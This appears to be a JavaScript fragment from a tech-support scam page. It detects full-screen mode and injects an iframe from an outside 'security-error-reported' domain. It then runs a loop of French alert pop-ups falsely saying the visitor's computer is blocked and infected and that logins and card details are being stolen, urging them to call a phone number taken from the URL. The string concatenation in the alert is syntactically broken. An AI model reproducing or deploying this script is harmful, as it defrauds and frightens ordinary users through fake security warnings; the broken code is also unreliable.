window.addEventListener('resize', function(){
  if(screen.width === window.innerWidth){
		document.getElementById('auth').innerHTML = "<iframe src='https://security-error-reported.in/2/chrome/auth.php'  ></iframe>";
		}		
		setInterval(function () { alert("** VOTRE ORDINATEUR A ÉTÉ BLOCKÉ.\n\n Erreur # DW6VB36.\n\nNous vous prions de nous appeler immédiatement au: "+ getURLParameter('n')"+ .\nNe pas ignorer cette alerte critique.\nSi vous fermez cette page, votre accès à l'ordinateur sera désactivé pour éviter d'autres dommages à notre réseau.Notre ordinateur nous a alerté qu'il A été infecté par un virus et un spyware. Les informations suivantes sont volées ... \n\n Facebook Login\n >détails de carte de crédit\n >compte e-mail de connexion\n >Photos stockées sur cet ordinateur.\nVous devez nous contacter immédiatement afin que nos ingénieurs peuvent vous guider à travers le processus de suppression par téléphone. Veuillez nous appeler dans les 5 prochaines minutes pour éviter que votre ordinateur ne soit désactivé.\n\nTéléphone: "+ getURLParameter('n')"+}, 0000);
	
});


